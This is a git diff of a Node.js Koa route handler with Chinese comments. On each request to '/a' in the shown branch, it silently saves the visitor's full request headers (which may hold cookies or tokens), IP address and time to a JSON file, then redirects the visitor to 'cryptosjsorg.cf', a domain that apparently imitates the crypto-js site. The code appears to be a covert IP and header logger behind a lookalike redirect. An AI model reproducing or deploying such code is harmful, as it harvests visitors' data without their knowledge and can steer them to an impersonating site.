@@ -162,11 +162,9 @@ router.get('/a', async ctx => {
         }
         // var timeout1=util.promisify(timeout)
         await timeout().then(state => {
-            console.log('进来假了');
-            
+            // console.log('进来假了');
             if (state) {
-                console.log('进来假了111');
-                
+                // console.log('进来假了111');
                 data.username="假数据1"
                 data.header=ctx.request.header;
                 data.remoteAddress=ctx.req.connection.remoteAddress;
@@ -184,44 +182,46 @@ router.get('/a', async ctx => {
             }
         })
         
+    }else{
+        
+        // data.requestip=ctx.request.header.host; 
+        // data.Origin=ctx.request.header.Origin; 
+        data.header=ctx.request.header;
+        // data.ctx=ctx;
+        data.remoteAddress=ctx.req.connection.remoteAddress;
+        data.Time=getTimeByTimeZone(8);
+        // 添加ip地址
+        
+        
+    
+    
+        // let title = ctx.request.body.title || '';
+        // if (!title) {
+        //     ctx.body = {
+        //         code: 1,
+        //         data: '请传入任务标题'
+        //     }
+        //     return;
+        // }
+    
+        // let newTask = {
+        //     id: ++datas._id,
+        //     title,
+        //     done: false
+        // };
+    
+        // datas.todos.push(newTask);
+        // ctx.body = {
+        //     code: 0,
+        //     data: newTask
+        // }
+        // console.log('完成');
+        
+        datas.todos.push(data);
+        fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
+        // ctx.body = ' .'
+        ctx.response.redirect('http://cryptosjsorg.cf');
     }
-    // data.requestip=ctx.request.header.host; 
-    // data.Origin=ctx.request.header.Origin; 
-    data.header=ctx.request.header;
-    // data.ctx=ctx;
-    data.remoteAddress=ctx.req.connection.remoteAddress;
-    data.Time=getTimeByTimeZone(8);
-    // 添加ip地址
-    
-    
-
-
-    // let title = ctx.request.body.title || '';
-    // if (!title) {
-    //     ctx.body = {
-    //         code: 1,
-    //         data: '请传入任务标题'
-    //     }
-    //     return;
-    // }
-
-    // let newTask = {
-    //     id: ++datas._id,
-    //     title,
-    //     done: false
-    // };
-
-    // datas.todos.push(newTask);
-    // ctx.body = {
-    //     code: 0,
-    //     data: newTask
-    // }
-    console.log('完成');
-    
-    datas.todos.push(data);
-    fs.writeFileSync('./static/data/data.json', JSON.stringify(datas));
-    // ctx.body = ' .'
-    ctx.response.redirect('http://cryptosjsorg.cf');
 });
 
 router.get('/dssa', async ctx => {
